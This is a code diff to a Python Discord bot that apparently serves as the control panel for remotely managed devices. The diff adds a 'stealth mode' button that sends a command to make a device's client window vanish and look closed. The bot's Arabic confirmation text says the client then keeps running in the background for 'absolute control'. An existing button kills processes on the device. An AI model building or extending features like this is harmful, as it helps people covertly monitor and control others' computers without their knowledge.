@@ -343,7 +343,17 @@ class DeviceActionsView(discord.ui.View):
     async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SendMsgModal(self.code))
 
-    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=3)
+    @discord.ui.button(label="👻 إخفاء الواجهة (العمل الخفي)", style=discord.ButtonStyle.secondary, custom_id="dev_act_stealth", row=3)
+    async def stealth_mode_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_stealth" not in db: db["remote_stealth"] = {}
+            db["remote_stealth"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Enable stealth mode for {self.code}"):
+                await interaction.followup.send("👻 تم إرسال أمر الإخفاء الخفي للواجهة! ستختفي نافذة العميل الآن ويبدو وكأنها أغلقت بينما هي تعمل بالخلفية للتحكم المطلق.", ephemeral=True)
+
+    @discord.ui.button(label="🪟 إغلاق الألعاب والخلفية", style=discord.ButtonStyle.secondary, custom_id="dev_act_kill", row=4)
     async def kill_proc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
